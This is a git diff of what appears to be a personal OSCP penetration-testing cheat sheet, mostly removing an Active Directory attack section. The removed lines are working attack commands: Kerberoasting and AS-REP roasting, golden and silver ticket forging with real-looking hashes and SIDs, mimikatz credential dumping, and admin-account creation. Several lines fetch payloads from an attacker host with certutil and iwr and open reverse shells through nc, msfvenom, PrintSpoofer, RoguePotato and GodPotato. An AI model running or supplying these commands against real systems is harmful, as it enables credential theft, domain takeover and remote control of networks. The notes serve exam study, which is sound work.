@@ -258,10 +258,6 @@ crackmapexec smb 192.168.x.x -u 'random' -p '' --shares
 
 ```
 
-## whoami /priv
-```bash
-SeManageVolumePrivilege
-```
 
 ## Powershell Encrypt && Decrypt credentials
 ```bash
@@ -280,45 +276,18 @@ $UnsecurePassword
 hHO_S9gff7ehXw
 ```
 
-# Active Directory Tools
-
-## secretsdump
-```bash
-impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
-```
-
-## enum4linux
-```bash
-enum4linux -a 192.168.201.175
-```
-
-## rpcclient
-```bash
-rpcclient 10.10.10.10
-rpcclient 10.10.10.10 -U '' -N
-> enumdomusers
-```
-
-## gpp-decrypt(Groups.xml)
-```bash
-gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ                                            
-```
 
 
-## smbmap
-```bash
-smbmap -H 192.168.x.x
-smbmap -H 192.168.x.x -u '' -p ''
-smbmap -u svc_tgs -p GPPstillStandingStrong2k18 -d active.htb -H 10.129.193.5
 
-```
 
-## net on kali
-```bash
-<Add user to Remote Access group on kali linux using net> 
-net rpc group addmem "REMOTE ACCESS" "Tracy.White" -U nara-security.com/Tracy.White%zqwj041FGX -S 192.168.193.30 
 
-```
+
+
+
+
+
+
+
 
 
 
@@ -366,23 +335,6 @@ ls \\dc1.corp.com\sysvol\corp.com\
 gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
 ```
 
-## AS-REP Roasting
-```bash
-GetNPUsers.py Egotistical-bank.local/fsmith -dc-ip 10.10.10.175 -request -no-pass
-
-impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
-.\Rubeus.exe asreproast /nowrap
-
-```
-
-
-## Kerberoast
-```bash
-sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
-GetUserSPNs.py -request -dc-ip 10.129.193.5 active.htb/svc_tgs
-
-.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
-```
 
 ## Overpass the Hash
 ```bash
@@ -401,156 +353,6 @@ sekurlsa::tickets /export
 dir *.kirbi
 kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
 ls \\web04\backup
-```
-
-
-## Silver Tickets
-![image](https://github.com/nuricheun/OSCP/assets/14031269/d19bd307-1d00-478a-925c-370b483dce13)
-![image](https://github.com/nuricheun/OSCP/assets/14031269/472ec5a4-4224-4b09-b2c4-6662e97865d9)
-```bash
-#Get domain SID
-whoami /user
-#IIS service ntlm from mimikatz or somewhere
-#mimikatz silver ticket attack
-kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
-iwr -UseDefaultCredentials http://web04
-
-# on kali machine
-ticketer.py -spn SPN -domain-sid DOMAIN SID -nthash NTLM -dc-ip IP_VICTIM -domain domain Administrator
-```
-
-## SharpHound.ps1
-```bash
-powershell -ep bypass
-. .\Sharphound.ps1
-Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\TEMP\
-```
-
-
-## Golden Tickets
-```bash
-# on windows
-privilege::debug
-lsadump::lsa
-kerberos::purge
-kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
-misc::cmd
-PsExec64.exe \\DC1 cmd.exe
-
-
-# on kali
-impacket-ticketer -nthash 1693c6cefafffc7af11ef34d1c788f47 -domain-sid S-1-5-21-1987370270-658905905-1781884369 -domain corp.com Administrator
-export KRB5CCNAME=./Administrator.ccache     
-mousepad /etc/resolv.conf
-    add > nameserver 192.168.x.x
-(or add dc1.corp.com inside of /etc/hosts file otherwise this attack will fail)
-psexec.py Administrator@dc1.corp.com -k -no-pass
-```
-
-
-## Add user
-```bash
-> net user nuri password123! /add
-> net localgroup administrators nuri /add
-
-```
-
-## crackmapexec
-```bash
-# local auth
---local-auth
-
-#smb
-crackmapexec smb 192.168.x.x -u '' -p '' --pass-pol
-crackmapexec smb 192.168.x.x -u '' -p '' --shares
-crackmapexec smb 192.168.x.x -u 'rand' -p '' --shares
-
-crackmapexec smb 192.168.x.x -u 'username' -p 'password' --shares
-crackmapexec smb 192.168.x.x -u username.txt -p 'password' --continue-on-success
-
-#ssh
-crackmapexec ssh 192.168.x.x -u 'username' -p 'password' --continue-on-success
-
-#ftp
-crackmapexec ftp 192.168.x.x -u "<% tp.frontmatter["USERNAME"] %>" -p "<% tp.frontmatter["PASSWORD"] %>" --continue-on-success
-
-#mssql
-crackmapexec mssql 192.168.x.x -u "<% tp.frontmatter["USERNAME"] %>" -p "<% tp.frontmatter["PASSWORD"] %>"
-crackmapexec mssql 10.10.85.148 -u sql_svc -p Dolphin1 -d oscp.exam --get-file "C:\TEMP\SAM" SAM
-
-#winrm
-crackmapexec winrm 192.168.x.x -u "<% tp.frontmatter["USERNAME"] %>" -p '<% tp.frontmatter["PASSWORD"] %>' -d <% tp.frontmatter["DOMAIN"] %>  --continue-on-success
-crackmapexec winrm 192.168.x.x  -u "<% tp.frontmatter["USERNAME"] %>" -H '' -d <% tp.frontmatter["DOMAIN"] %> --continue-on-success
-proxychains -q crackmapexec winrm 172.16.80.21 -u Administrator -p 'vau!XCKjNQBv2$' -x 'certutil -urlcache -f http://192.168.45.176:8000/revshell7777.exe C:\Users\Public\revshell7777.exe'
-proxychains -q crackmapexec winrm 172.16.80.21 -u Administrator -p 'vau!XCKjNQBv2$' -x 'C:\Users\Public\revshell7777.exe'
-
-```
-
-## psexec
-```bash
-psexec.py -hashes '2f2b8d5d4d756a2c72c554580f970c14:2f2b8d5d4d756a2c72c554580f970c14' Administrator@192.168.190.247
-psexec.py active.htb/administrator@10.129.193.5
-
-
-When psexec not working
-  - crackmapexec smb -x whoami
-  - xfreerdp
-  - winrm
-  - See if we can upload files through shares using smbclient
-```
-
-
-## mimikatz
-```bash
-privilege::debug
-token::elevate
-
-sekurlsa::logonpasswords
-sekurlsa::tickets
-lsadump::sam
-lsadump::lsa
-
-```
-
-## Invoke-Mimikatz
-```bash
-Invoke-Mimikatz -Command '"lsadump::dcsync /domain:Egotistical-bank.local /user:Administrator"'
-
-```
-
-## Code Snippet to check where our code is executed
-```bash
-(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
-(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell
-```
-
-## PrintSpoofer
-```bash
-iwr -uri http://192.168.45.176/PrintSpoofer64.exe -Outfile PrintSpoofer.exe
-iwr -uri http://192.168.45.176/nc.exe -Outfile nc.exe
-.\PrintSpoofer.exe -c "C:\TEMP\nc.exe 192.168.45.176 1337 -e cmd"
-```
-
-## RoguePotato
-```bash
-sudo socat tcp-listen:135,reuseaddr,fork tcp:<TARGET.MACHINE.IP>:9999
-## sudo socat tcp-listen:135,reuseaddr,fork tcp:192.168.217.247:9999
-
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.176 LPORT=53 -f exe > reverse.exe
-nc -nvlp 53
-
-iwr -uri http://192.168.45.176/RoguePotato.exe -Outfile RoguePotato.exe
-iwr -uri http://192.168.45.176/reverse.exe -Outfile reverse.exe
-
-.\RoguePotato.exe -r 192.168.45.176 -l 9999 -e ".\reverse.exe"
-```
-
-## GodPotato
-```bash
-Windows Privesc: God Potato(https://github.com/BeichenDream/GodPotato)
-.\GodPotato.exe -cmd "cmd /c whoami"
-.\GodPotato.exe -cmd ".\revshell7777.exe"
-.\GodPotato.exe -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.45.176 7777"
 ```
 
 # HTTP/HTTPS(80,8080,8000,443...)
@@ -1089,8 +891,6 @@ def command = “powershell -c iex(new-object net.webclient).downloadstring(‘h
 def proc = command.execute()
 println(proc.in.text)
 ```
-
-
 
 # Active Directory Privilege
 
